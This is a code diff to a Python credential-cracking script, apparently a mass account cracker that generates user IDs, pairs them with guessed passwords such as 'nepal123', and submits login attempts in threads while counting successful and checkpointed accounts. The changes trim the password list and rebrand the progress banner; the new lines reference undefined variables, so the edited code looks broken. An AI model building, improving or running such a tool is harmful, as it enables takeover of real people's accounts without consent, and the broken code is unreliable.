@@ -468,7 +468,7 @@ class Akash:
             print(f"---------------------------------------------------")
             for love in bou:
                 ids = code + love
-                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'kathmandu','free fire','nepal123']
+                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal123']
                 My_Tanisha.submit(crack_rand,ids,passlist)
         print('')
         linex()
@@ -480,7 +480,7 @@ class Akash:
 ##------------------[ CRACK-MT ]------------------##
 def crack_file_A(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r {W}[LIMON>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
+    sys.stdout.write(f"\r {P}[MANAS]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     try:
         fn = names.split(' ')[0]
@@ -553,7 +553,7 @@ def crack_file_A(ids,names,passlist):
 
 def crack_rand(ids,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r {W}[LIMON>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
+    sys.stdout.write(f"\r {P}[MANAS-RANDOM]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     try:
         for pas in passlist:
